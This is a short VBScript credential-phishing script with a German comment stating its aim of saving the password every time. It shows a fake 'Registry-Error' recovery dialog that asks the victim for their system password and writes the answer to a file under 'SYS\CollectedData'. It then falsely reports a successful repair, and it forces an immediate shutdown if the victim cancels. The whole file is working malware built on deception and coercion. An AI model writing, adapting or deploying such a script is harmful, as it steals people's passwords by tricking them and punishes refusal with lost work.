'Passwort wenn erfolgreich jedesmal in eine Textdatei schreiben!

Dim password, turnoff, strInput, objFSO, objFile
Const strFileName = "SYS\CollectedData\Password.wsdt"

Const ForReading      = 1
Const ForWriting      = 2
Const ForAppending    = 8
Const CreateNotExist  = True
password = inputbox ("Registry-Error 0x54D9W90 - We try to recover your Settings"& vbLf &"- Please enter your System-Password below. "& vbLf & vbLf &"Privacy-ATTENTION: The Password cannot be covered. ","RECOVERY: Administrator Authentification","")

if password=FALSE then
n=MsgBox("Windows-Recovery cancelled",16+0,"Betriebssystem beschädigt")

Set turnoff = CreateObject("WScript.Shell")
turnoff.run ("Cmd /C shutdown -p"), 0, true

else 

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.OpenTextFile(strFileName, ForWriting, CreateNotExist)

objFile.WriteLine password

n=MsgBox("Windows-Recovery successful",0+64,"System-Einstellungen wiederhergestellt")

END IF




